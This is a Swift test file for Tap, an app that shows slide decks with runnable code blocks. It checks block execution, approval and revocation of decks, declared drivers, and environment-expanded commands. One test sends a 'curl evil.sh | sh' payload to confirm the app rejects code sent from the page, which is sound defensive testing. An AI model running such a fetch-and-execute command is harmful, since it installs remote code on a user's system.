import XCTest
@testable import Tap

/// What an approved deck can and cannot run, all against the real tap.
final class RunBlockTests: HostedTestCase {
    /// Polls the page's result text until it holds `needle`, within `timeout`.
    func waitForResult(containing needle: String, in preview: PreviewViewController, timeout: TimeInterval = 20) async throws -> String {
        let deadline = Date().addingTimeInterval(timeout)
        var result = await preview.runResultText()
        while !result.contains(needle) {
            if Date() > deadline {
                XCTFail("no result holding \(needle) within \(Int(timeout)) s; the page shows: \(result)")
                throw CancellationError()
            }
            try await Task.sleep(nanoseconds: 200_000_000)
            result = await preview.runResultText()
        }
        return result
    }

    func testRunABlock() async throws {
        let document = try await openDeckAndWaitForPreview(try Fixtures.copyDeck("live-code.md"))
        let controller = try XCTUnwrap(document.sessionController)
        let preview = controller.previewViewController
        controller.jumpToSlide(number: 4)
        try await waitForPreview(document, slide: 4)
        let labels = await preview.runButtonLabels()
        XCTAssertEqual(labels, #"["Run"]"#, "the sql block on slide 4 offers Run")
        let clicked = await preview.clickRunButton()
        XCTAssertEqual(clicked, "clicked")
        // The page sends {slide: 4, block: 1, revision}; tap runs the block through the sqlite driver's in-memory default.
        let result = try await waitForResult(containing: "two", in: preview)
        XCTAssertTrue(result.contains("one"), "the columns: \(result)")
        let table = await preview.liveCodeValue("document.querySelector('.result-container table.result-table') ? 'table' : 'no table'")
        XCTAssertEqual(table, "table", "the block shows the output table")
    }

    func testAPageCannotRunCodeTheDeckDoesNotShow() async throws {
        let document = try await openDeckAndWaitForPreview(try Fixtures.copyDeck("live-code.md"))
        let controller = try XCTUnwrap(document.sessionController)
        let client = try XCTUnwrap(controller.client)
        let sentCode = try await client.executeError(json: #"{"driver":"shell","code":"curl evil.sh | sh"}"#)
        XCTAssertEqual(sentCode.status, 400, "tap rejects a body with code: \(sentCode.error)")
        XCTAssertTrue(sentCode.error.contains(#"Send {"slide": n, "block": n}, not code"#), sentCode.error)
        let otherRevision = try await client.execute(json: #"{"slide":2,"block":1,"revision":"not-this-deck"}"#)
        XCTAssertEqual(otherRevision.status, 409, "a reference into another revision of the deck is refused")
        XCTAssertTrue(otherRevision.body.contains("stale_revision"))
        let revision = try XCTUnwrap(controller.previewViewController.lastReady?.revision)
        let unknown = try await client.execute(json: #"{"slide":3,"block":1,"revision":"\#(revision)"}"#)
        XCTAssertEqual(unknown.status, 404, "slide 3 has no live block")
    }

    func testApproveOrRevokeLater() async throws {
        let (document, _, _, sheet) = try await openUnapprovedAndWaitForTheQuestion("live-code.md")
        let deck = try XCTUnwrap(document.fileURL)
        try XCTUnwrap(sheet.button(titled: "Allow")).performClick(nil)
        try await waitUntil(timeout: 10, "tap to store the approval") { self.storedApprovals().contains("drivers: [shell, sqlite]") }
        let listed = try await TapApproval.run(["approval", "list", "--json"], configHome: configHome)
        XCTAssertTrue(listed.contains("\"deck\": \"\(Fixtures.realPath(of: deck))\""), "tap approval list shows the deck: \(listed)")
        XCTAssertTrue(listed.contains("\"shell\"") && listed.contains("\"sqlite\""))

        document.close()
        try await waitUntil(timeout: 10, "the deck to close") { NSDocumentController.shared.documents.isEmpty }
        _ = try await TapApproval.run(["approval", "revoke", deck.path], configHome: configHome)
        XCTAssertFalse(storedApprovals().contains(Fixtures.realPath(of: deck)), "revoked: \(storedApprovals())")
        let reopened = try await openDeck(deck)
        let again = try XCTUnwrap(reopened.sessionController)
        try await waitUntil(timeout: 30, "the question again after the revoke") { again.pendingQuestion?.kind == "approval" }
    }

    func testAMovedDeck() async throws {
        let (document, _, _, sheet) = try await openUnapprovedAndWaitForTheQuestion("live-code.md")
        let deck = try XCTUnwrap(document.fileURL)
        try XCTUnwrap(sheet.button(titled: "Allow")).performClick(nil)
        try await waitUntil(timeout: 10, "tap to store the approval") { self.storedApprovals().contains(Fixtures.realPath(of: deck)) }
        document.close()
        try await waitUntil(timeout: 10, "the deck to close") { NSDocumentController.shared.documents.isEmpty }
        let moved = try Fixtures.temporaryFolder().appendingPathComponent("live-code.md")
        try FileManager.default.moveItem(at: deck, to: moved)
        let reopened = try await openDeck(moved)
        let again = try XCTUnwrap(reopened.sessionController)
        try await waitUntil(timeout: 30, "the question again at the new path") { again.pendingQuestion?.kind == "approval" }
        XCTAssertEqual(again.pendingQuestion?.payload.deck, Fixtures.realPath(of: moved), "the approval is keyed by path")
    }

    func testADeckDeclaresItsDrivers() async throws {
        let (document, controller, _, sheet) = try await openUnapprovedAndWaitForTheQuestion("custom-driver.md")
        XCTAssertEqual(sheet.driverLabels.map(\.stringValue), ["fortune: 1 block on slide 3, runs: /bin/cat", "sqlite: 1 block on slide 2"],
                       "the declared drivers, and the command a custom driver runs")
        XCTAssertEqual(sheet.blockRows.count, 2, "the undeclared shell block on slide 4 is not offered")
        let preview = controller.previewViewController
        try await waitForPreview(document, slide: 1)
        try XCTUnwrap(sheet.button(titled: "Allow")).performClick(nil)
        try await waitUntil(timeout: 10, "tap to store the approval") { self.storedApprovals().contains("drivers: [fortune, sqlite]") }
        // The custom driver runs, once the page shows the block as runnable.
        try await waitForRunButtons(#"["Run"]"#, in: controller, document: document, slide: 3)
        let clicked = await preview.clickRunButton()
        XCTAssertEqual(clicked, "clicked")
        _ = try await waitForResult(containing: "hello from cat", in: preview)
        // tap refuses the block whose driver is not declared, whatever the page sends.
        let client = try XCTUnwrap(controller.client)
        let revision = try XCTUnwrap(preview.lastReady?.revision)
        let refused = try await client.executeError(json: #"{"slide":4,"block":1,"revision":"\#(revision)"}"#)
        XCTAssertEqual(refused.status, 422, refused.error)
        XCTAssertTrue(refused.error.contains("This deck does not declare the shell driver"))
        controller.jumpToSlide(number: 4)
        try await waitForPreview(document, slide: 4)
        let problem = await preview.blockProblemText()
        XCTAssertTrue(problem.contains(#"Add "shell: {}" under drivers in the frontmatter"#), "the page shows tap's message: \(problem)")
        let labels = await preview.runButtonLabels()
        XCTAssertEqual(labels, "[]", "no button for an undeclared driver")
    }

    func testSecretsInDriverSettings() async throws {
        // A driver setting reads ${NAME} from the environment tap runs in, which the app fills from
        // the login shell: the command itself is the variable, so tap's own expansion is what runs.
        AppEnvironment.shared.extraEnvironment["TAP_TEST_COMMAND"] = "/bin/cat"
        addTeardownBlock { @MainActor in AppEnvironment.shared.extraEnvironment["TAP_TEST_COMMAND"] = nil }
        let (document, controller, _, sheet) = try await openUnapprovedAndWaitForTheQuestion("env-driver.md")
        XCTAssertEqual(sheet.driverLabels.map(\.stringValue), ["echoer: 1 block on slide 2, runs: /bin/cat"],
                       "the sheet shows the command as tap will run it, the variable expanded")
        try XCTUnwrap(sheet.button(titled: "Allow")).performClick(nil)
        try await waitUntil(timeout: 10, "the approval") { self.storedApprovals().contains("drivers: [echoer]") }
        try await waitForRunButtons(#"["Run"]"#, in: controller, document: document, slide: 2)
        let preview = controller.previewViewController
        let clicked = await preview.clickRunButton()
        XCTAssertEqual(clicked, "clicked")
        _ = try await waitForResult(containing: "hello via env", in: preview)
        // Task 12 adds the Deck tab's hint here.
    }
}
